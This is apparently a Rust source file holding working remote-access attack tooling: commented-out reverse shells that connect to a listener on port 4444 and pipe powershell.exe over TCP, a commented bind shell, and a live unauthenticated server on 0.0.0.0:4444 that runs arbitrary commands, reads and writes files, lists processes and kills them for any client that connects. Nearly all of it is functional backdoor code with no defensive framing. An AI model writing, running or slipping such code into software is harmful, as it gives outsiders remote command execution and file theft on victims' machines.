// use std::process::{Command, Stdio}; 
// use std::io::{Read, Write}; 
// use std::error::Error;
// use tokio::net::TcpStream;
// use tokio::io::{AsyncReadExt, AsyncWriteExt};

// #[tokio::main]
// async fn main() -> Result<(), Box<dyn Error>>{
//     let ip = "127.0.0.1".to_string();
//     let port = 4444.to_string();
    
//     shell(ip, port).await?;
//     Ok(())
// }

// async fn shell(ip: String, port: String) -> Result<() , Box<dyn Error>>{
//     let home = format!("{}:{}", ip,port);
//     rev(home).await
// }


// async fn rev(home: String) -> Result<(), Box<dyn Error>> {
//     let mut s = TcpStream::connect(&home).await?;

//     loop {
//         // Open shell
//         let mut process = Command::new("powershell.exe")
//             .stdin(Stdio::piped())
//             .stdout(Stdio::piped())
//             .stderr(Stdio::piped())
//             .spawn()?;

//         if let Some(ref mut stdin) = process.stdin {
//             let mut buf = vec![0; 1024];
//             let n = s.read(&mut buf).await?;
//             stdin.write_all(&buf[..n])?;
//         }

//         if let Some(ref mut stdout) = process.stdout {
//             let mut buf = vec![0; 1024];
//             let n = stdout.read(&mut buf)?;
//             s.write_all(&buf[..n]).await?;
//         }

//         // Wait for the process to complete and capture the output
//         let output = process.wait_with_output()?;
//         s.write_all(&output.stdout).await?;
//         s.write_all(&output.stderr).await?;
//     }
// }


// use std::process::{Command, Stdio};
// use std::io::{Write, Read};
// use std::error::Error;
// use tokio::net::TcpStream;
// use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};

// #[tokio::main]
// async fn main() -> Result<(), Box<dyn Error>> {
//     let ip = "127.0.0.1".to_string();
//     let port = "4444".to_string();
//     shell(ip, port).await?;
//     Ok(())
// }

// async fn shell(ip: String, port: String) -> Result<(), Box<dyn Error>> {
//     let home = format!("{}:{}", ip, port);
//     sh(home).await
// }

// async fn sh(home: String) -> Result<(), Box<dyn Error>> {
//     let mut s = TcpStream::connect(&home).await?;
//     let mut reader = BufReader::new(s);

//     let mut process = Command::new("powershell.exe")
//         .stdin(Stdio::piped())
//         .stdout(Stdio::piped())
//         .stderr(Stdio::piped())
//         .spawn()?;

//     let mut stdin = process.stdin.take().expect("Failed to open stdin");
//     let mut stdout = process.stdout.take().expect("Failed to open stdout");
//     let mut stderr = process.stderr.take().expect("Failed to open stderr");

//     let mut buffer = vec![0; 1024];

//     loop {
//         let n = reader.read(&mut buffer).await?;
//         if n == 0 {
//             break; 
//         }
//         stdin.write_all(&buffer[..n])?;
//         stdin.flush()?;

//         let n = stdout.read(&mut buffer)?;
//         if n > 0 {
//             reader.get_mut().write_all(&buffer[..n]).await?;
//         }

//         let n = stderr.read(&mut buffer)?;
//         if n > 0 {
//             reader.get_mut().write_all(&buffer[..n]).await?;
//         }
//     }

//     Ok(())
// }

// use tokio::net::TcpListener;
// use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
// use std::error::Error;

// #[tokio::main]
// async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
//     let listener = TcpListener::bind("0.0.0.0:4444").await?;
//     println!("Server listening on port 4444");

//     loop {
//         let (socket, _) = listener.accept().await?;
//         tokio::spawn(handle_client(socket));
//     }
// }

// async fn handle_client(socket: tokio::net::TcpStream) -> Result<(), Box<dyn Error + Send + Sync>> {
//     let (reader, mut writer) = socket.into_split();
//     let mut reader = BufReader::new(reader);

//     loop {
//         let mut line = String::new();
//         let bytes_read = reader.read_line(&mut line).await?;
//         if bytes_read == 0 {
//             break; 
//         }
//         print!("Client: {}", line);

//         let output = if cfg!(target_os = "windows") {
//             std::process::Command::new("powershell.exe")
//                 .args(&["/C", line.trim()])
//                 .output()
//                 .expect("failed to execute command")
//         } else {
//             std::process::Command::new("sh")
//                 .arg("-c")
//                 .arg(line.trim())
//                 .output()
//                 .expect("failed to execute command")
//         };

//         writer.write_all(&output.stdout).await?;
//         writer.write_all(&output.stderr).await?;
//         writer.flush().await?;
//     }
//     Ok(())
// }

use tokio::net::TcpListener;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader, BufWriter};
use std::error::Error;
use std::process::Command;
use std::fs;
use std::str::from_utf8;
use base64::{Engine as _, engine::general_purpose};

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    let listener = TcpListener::bind("0.0.0.0:4444").await?;
    println!("Server listening on port 4444");

    loop {
        let (socket, _) = listener.accept().await?;
        tokio::spawn(handle_client(socket));
    }
}

async fn handle_client(socket: tokio::net::TcpStream) -> Result<(), Box<dyn Error + Send + Sync>> {
    let (reader, writer) = socket.into_split();
    let mut reader = BufReader::new(reader);
    let mut writer = BufWriter::new(writer);

    loop {
        let mut command = String::new();
        let bytes_read = reader.read_line(&mut command).await?;
        if bytes_read == 0 {
            break; // Connection closed
        }

        let response = match command.trim() {
            cmd if cmd.starts_with("exec ") => exec_command(&cmd[5..]).await,
            cmd if cmd.starts_with("download ") => download_file(&cmd[9..]).await,
            cmd if cmd.starts_with("upload ") => upload_file(&cmd[7..], &mut reader).await,
            cmd if cmd.starts_with("ls ") => list_directory(&cmd[3..]).await,
            cmd if cmd.starts_with("ps") => list_processes().await,
            cmd if cmd.starts_with("kill ") => kill_process(&cmd[5..]).await,
            _ => Err(format!("Unknown command: {}", command.trim())),
        };

        match response {
            Ok(output) => {
                writer.write_all(output.as_bytes()).await?;
            }
            Err(e) => {
                writer.write_all(format!("Error: {}\n", e).as_bytes()).await?;
            }
        }

        writer.flush().await?;
    }

    Ok(())
}

async fn exec_command(command: &str) -> Result<String, String> {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", command])
            .output()
            .map_err(|e| e.to_string())?
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .map_err(|e| e.to_string())?
    };

    Ok(format!(
        "{}{}",
        from_utf8(&output.stdout).unwrap_or(""),
        from_utf8(&output.stderr).unwrap_or("")
    ))
}

async fn download_file(path: &str) -> Result<String, String> {
    let contents = fs::read(path).map_err(|e| e.to_string())?;
    Ok(general_purpose::STANDARD.encode(&contents))
}

async fn upload_file(path: &str, reader: &mut BufReader<tokio::net::tcp::OwnedReadHalf>) -> Result<String, String> {
    let mut file_data = String::new();
    reader.read_line(&mut file_data).await.map_err(|e| e.to_string())?;
    let decoded = general_purpose::STANDARD.decode(file_data.trim()).map_err(|e| e.to_string())?;
    fs::write(path, decoded).map_err(|e| e.to_string())?;
    Ok("File uploaded successfully".to_string())
}

async fn list_directory(path: &str) -> Result<String, String> {
    let entries = fs::read_dir(path).map_err(|e| e.to_string())?;
    let mut result = String::new();
    for entry in entries {
        let entry = entry.map_err(|e| e.to_string())?;
        result.push_str(&format!("{}\n", entry.file_name().to_string_lossy()));
    }
    Ok(result)
}

async fn list_processes() -> Result<String, String> {
    let output = if cfg!(target_os = "windows") {
        Command::new("tasklist")
            .output()
            .map_err(|e| e.to_string())?
    } else {
        Command::new("ps")
            .arg("aux")
            .output()
            .map_err(|e| e.to_string())?
    };

    Ok(format!(
        "{}{}",
        from_utf8(&output.stdout).unwrap_or(""),
        from_utf8(&output.stderr).unwrap_or("")
    ))
}

async fn kill_process(pid: &str) -> Result<String, String> {
    let pid: u32 = pid.parse().map_err(|e: std::num::ParseIntError| e.to_string())?;
    if cfg!(target_os = "windows") {
        Command::new("taskkill")
            .args(&["/PID", &pid.to_string(), "/F"])
            .output()
            .map_err(|e| e.to_string())?;
    } else {
        Command::new("kill")
            .arg("-9")
            .arg(pid.to_string())
            .output()
            .map_err(|e| e.to_string())?;
    }
    Ok(format!("Killed process {}", pid))
}
